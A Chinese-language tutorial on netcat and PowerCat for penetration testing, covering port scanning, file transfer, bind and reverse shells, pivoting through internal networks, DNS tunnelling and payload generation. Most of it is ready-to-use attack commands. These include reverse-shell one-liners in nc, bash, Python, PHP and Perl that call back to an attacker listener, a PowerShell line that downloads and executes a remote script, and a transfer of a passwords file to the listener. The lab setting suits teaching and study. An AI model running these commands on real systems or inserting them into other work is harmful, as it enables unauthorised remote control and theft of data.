## 简易使用

### Banner抓取

Banner抓取是一种在开放端口上检索关于特定服务信息的技术，在渗透测试中用于漏洞的评估

执行以下命令，可以得知目标主机端口运行的服务

    
    
    nc -nv <Your IP> <Port>
    

![2470797-20210903103108673-1822451193.png](https://image.3001.net/images/20220127/1643261404_61f22ddc0c7b0f52115ee.png!small)

### 远程连接主机

    
    
    nc -nvv <Your IP> <Port>
    

### 端口扫描

扫描指定端口

    
    
    nc -v <Your IP> <Port>
    

![2470797-20210903103421855-1848611583.png](https://image.3001.net/images/20220127/1643261404_61f22ddca0028a6ba7938.png!small)

扫描指定端口段(速度较慢)

    
    
    nc -v -z <Your IP> <Port>-<Port>
    

### 端口监听

监听本地端口，访问时输出到命令行

    
    
    nc -l -p 9999

![2470797-20210903103752864-993290439.png](https://image.3001.net/images/20220127/1643261405_61f22ddd1bac0e58714fd.png!small)

### 文件传输

在本地服务器生成一个1.txt文件并监听

    
    
    nc -lp 333 >1.txt
    

在目标主机与服务器333端口建立连接，传输一个password文件

    
    
    nc -vn 192.168.200.6 333 < passwords.txt -q 1　　

![2470797-20210903104238584-346141379.png](https://image.3001.net/images/20220127/1643261405_61f22ddd8892ec55c2c34.png!small)

### 简易聊天

本地服务器监听

    
    
    nc -l -p 9999
    

目标主机输入

    
    
    nc -nv 192.168.200.6 9999　

![2470797-20210903104755127-189185562.png](https://image.3001.net/images/20220127/1643261405_61f22ddde1774f3d746cc.png!small)

## 获取SHELL

### 正向shell（客户端获取服务器shell）

控制端主动发起连接去连接被控制端。

目标主机输入命令监听目标主机9999端口

    
    
    nc -lvp 9999 -e /bin/sh     //Lunix
    nc -lvp 9999 -e c:\windows\system32\cmd.exe   //Windows
    

![2470797-20210903124001129-226505131.png](https://image.3001.net/images/20220127/1643261406_61f22dde43a2be008bd33.png!small)

输入命令在本地或者服务器上连接目标主机的9999端口

    
    
    nc 192.168.200.6 9999
    

![2470797-20210903124540232-1457437323.png](https://image.3001.net/images/20220127/1643261406_61f22ddead0e8fede76bc.png!small)

### 反向shell（服务器获取客户端shell）

被控制端主动连接控制端。

输入命令在本地或者服务器上监听9999端口

    
    
    nc -lvp 9999
    

目标主机输入命令连接服务器9999端口

    
    
    nc 192.168.200.6 9999 -e /bin/sh    //Linux
    nc 192.168.200.6 9999 -e c:\windows\system32\cmd.exe    //Windows
    

![2470797-20210903124949429-512481065.png](https://image.3001.net/images/20220127/1643261407_61f22ddf1db5a43c68b14.png!small)

## 在目标主机中没有nc时获取反向shell

一般情况目标主机中是没有nc的，可以使用其他工具和编程语言代替nc，实现反向连接

### Python反向Shell

在服务器监听本地9999端口

    
    
    nc -lvp 9999
    

在目标主机执行如下命令

    
    
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.200.6",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    

![2470797-20210903130246057-743139139.png](https://image.3001.net/images/20220127/1643261407_61f22ddf7d7892aa22a6e.png!small)

### bash反向Shell

在服务器监听本地9999端口

    
    
    nc -lvp 9999

在目标主机执行如下命令

    
    
    bash -c 'exec bash -i >& /dev/tcp/192.168.200.6/9999 0>&1'
    

### PHP反向Shell

在服务器监听本地9999端口

    
    
    nc -lvp 9999

PHP常用在Web服务器上，是nc，perl和Bash很好的替代品

    
    
    php -r '$sock=fsockopen("192.168.200.6",9999);exec("/bin/sh -i <&3 >&3 2>&3");'
    

![2470797-20210903151750370-1731157586.png](https://image.3001.net/images/20220127/1643261407_61f22ddfd937c25ca4570.png!small)

### Perl反向Shell

在服务器监听本地9999端口

    
    
    nc -lvp 9999

如果此时目标主机使用的是Perl语言，仍然可以使用Perl来建立反向Shell

在目标主机运行如下命令

    
    
    perl -e 'use Socket;$i="192.168.200.6";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">$S");open(STDOUT,">$S");open(STDERR,">&S");exec("/bin/sh -i");};'
    

![2470797-20210903161504551-2016485599.png](https://image.3001.net/images/20220127/1643261408_61f22de0647bc6beb7964.png!small)

## 内网代理

如图所示，测试环境为：攻击者服务器( Kali Linux);一个小型内网；三台服务器。假设获取了Web服务器的权限，通过 Kali
Linux机器不能访问数据库服务器( Linux),但通过web服务器可以访问数据库服务器( Linux)。测试目标为：获取数据库服务器(
Linux)的Shell

![2470797-20210903162235253-1222565443.png](https://image.3001.net/images/20220127/1643261408_61f22de0ee5abffe76717.png!small)

首先在服务器输入如下命令监听9999端口

    
    
    nc -lvp 9999
    

接着在数据库服务器执行如下命令

    
    
    nc -lvp 9999 -e /bin/sh
    

最后在Web服务器执行如下命令

    
    
    nc -v 192.168.1.4 9999  -c "nc -v 1.1.1.200 9999"
    

## PowerCat

PowerCat可以说是nc的PowerShell版本，PowerCat可以通过执行命令回到本地运行，也可以使用远程权限运行[powercat(github.com)](https://github.com/besimorhino/powercat)

导入powercat输入Import-Module .\powercat.ps1

输入“powercat -h”查看命令提示

### 通过nc正向连接PowerCat

在Windows server 2008服务器上执行监听命令

    
    
    powercat -l -p 8080 -e cmd.exe -v
    

然后在kali上执行

    
    
    netcat 192.168.200.6 8080 -vv
    

![2470797-20210903191634219-701629268.png](https://image.3001.net/images/20220127/1643261410_61f22de2868016f667d3a.png!small)

![2470797-20210903191643657-1944146183.png](https://image.3001.net/images/20220127/1643261410_61f22de2ddb016cfb2f30.png!small)

### 通过nc反向连接PowerCat

在kali上监听

    
    
    nc -l -p 9999 -vv
    

在Windows server 2008执行，-c参数用于提供想要连接的IP地址

    
    
    powercat -c 192.168.200.6 -p 9999 -v -e cmd.exe
    

![2470797-20210903192422984-2057905122.png](https://image.3001.net/images/20220127/1643261411_61f22de3395754c863990.png!small)

### 通过PowerCat返回PowerShell

前面的操作都是可以与nc进行交互。但是，如果想返回PowerShell，则无法与nc进行交互。下面介绍如何让Windows7和Windows server
2008建立正向连接

在Win7执行下载命令

    
    
    IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.1/powercat.ps1')

再执行监听命令

    
    
    powercat -l -p 9999 -v　　

在Win server 2008执行如下命令 -ep用于返回PowerShell

    
    
    powercat -c 192.168.1.3 -p 9999 -v -ep
    

![2470797-20210903194608227-459945444.png](https://image.3001.net/images/20220127/1643261411_61f22de3aa7571ef70bdc.png!small)

### 通过PowerCat传输文件

在win2008新建一个test.txt文件放在c盘根目录下，在win7执行命令

    
    
    powercat -l -p 9999 -of test.txt -v
    

回到win2008中执行命令

    
    
    powercat -c 192.168.1.3 -p 9999 -i c:\test.txt -v
    

### 通过PowerCat生成Payload

用PowerCat生成的Payload也有正向和反向之分，且可以对其进行编码

在win2008执行命令生成一个简单的payload

    
    
    powercat -l -p 8000 -e cmd -v -g >> shell.ps1
    

将生成的ps1文件上传到win7并执行，然后在win2008上执行如下命令反弹shell

    
    
    powercat -c 192.168.1.3 -p 8000 -v
    

![2470797-20210903202637304-1191313644.png](https://image.3001.net/images/20220127/1643261412_61f22de43d8ecaac6e40a.png!small)

如果想要反弹PowerShell,win2008执行命令

    
    
    powercat -l -p 8000 -ep -v -g >> shell.ps1

将生成的ps1文件上传到win7并执行，然后在win2008上执行如下命令反弹Powershell

    
    
    powercat -c 192.168.1.3 -p 8000 -v

![2470797-20210903211304262-472948672.png](https://image.3001.net/images/20220127/1643261412_61f22de49f40219773407.png!small)

### PowerCat DNS隧道通信

PowerCat是一套基于DNS通信的协议，基于dnscat设计的

使用dnscat,依次执行

    
    
    git clone https://github.com/iagox86/dnscat2 
    cd dnscat2/server/

gem install bundler

bundle install

在安装了dnscat的Linux主机上运行

    
    
    ruby dnscat2.rb ttpowercat.test -e open --no-cache
    

返回win2008执行命令

    
    
    powercat -c 192.168.200.6 -p 53 -dns ttpowercat.test -e cmd.exe
    

![2470797-20210903213537995-1501621890.png](https://image.3001.net/images/20220127/1643261413_61f22de52f039d9a4e86b.png!small)

### 将PowerCat作为跳板

测试环境为：三台主机，其中 Windows Server2008主机可以通过ping命令访问 Windows7主机和 Kali Linux主机， Kali
Linux主机和 Windows7主机之间无法通过网络连接。测试目标为：将 Windows Server2008主机作为跳板，让 Kali
Linux主机连接Windows7主机。

首先，在 Windows7中执行如下命令。

    
    
    powercat -l -v -p 9999 -e cmd.exe
    

Windows Server2008中执行如下命令。

    
    
    powercat -l -v -p 8000 -r tcp:192.168.1.3:9999
    

最后，让 Kali Linux主机与 Windows Server2008主机进行连接，Windows
Server2008主机就可以将流量转发给Windows7了

    
    
    nc 192.168.200.24 8000 -vv
    

![2470797-20210903215104273-1016842273.png](https://image.3001.net/images/20220127/1643261413_61f22de59ad64be1ffec0.png!small)

![2470797-20210903215125074-580225080.png](https://image.3001.net/images/20220127/1643261414_61f22de602c9ce3ea6b74.png!small)

![2470797-20210903215143081-1532406475.png](https://image.3001.net/images/20220127/1643261414_61f22de659ab68422730e.png!small)

  

